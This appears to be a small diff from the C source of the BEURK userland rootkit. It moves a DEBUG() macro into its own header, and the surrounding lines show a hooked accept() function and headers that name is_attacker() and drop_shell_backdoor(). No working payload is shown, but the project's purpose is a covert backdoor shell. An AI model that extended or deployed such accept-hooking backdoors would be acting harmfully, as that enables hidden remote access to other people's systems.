@@ -19,8 +19,9 @@
  */
 
 #include <sys/socket.h> /* struct sockaddr, socklen_t */
-#include "beurk.h" /* DEBUG(), is_attacker(), drop_shell_backdoor() */
+#include "beurk.h" /* is_attacker(), drop_shell_backdoor() */
 #include "config.h" /* REAL_ACCEPT() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 int         accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
